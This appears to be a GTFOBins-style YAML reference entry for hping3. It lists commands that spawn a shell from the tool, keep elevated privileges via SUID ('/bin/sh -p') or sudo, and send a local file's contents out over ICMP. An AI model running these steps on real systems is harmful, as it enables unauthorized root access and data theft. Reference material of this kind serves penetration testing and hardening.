---
functions:
  shell:
    - code: |
        hping3
        /bin/sh
  suid:
    - code: |
        ./hping3
        /bin/sh -p
  file-read:
    - description: It is possible to send specific file contents if hping3 has sufficient permission.
    - code: |
        hping3 --icmp 127.0.0.1 --listen --signature --safe
        hping3 --icmp 127.0.0.1 --d 100 --c 2 --sign signature --file ./file.txt
  sudo:
    - code: |
        sudo hping3
        /bin/sh
---
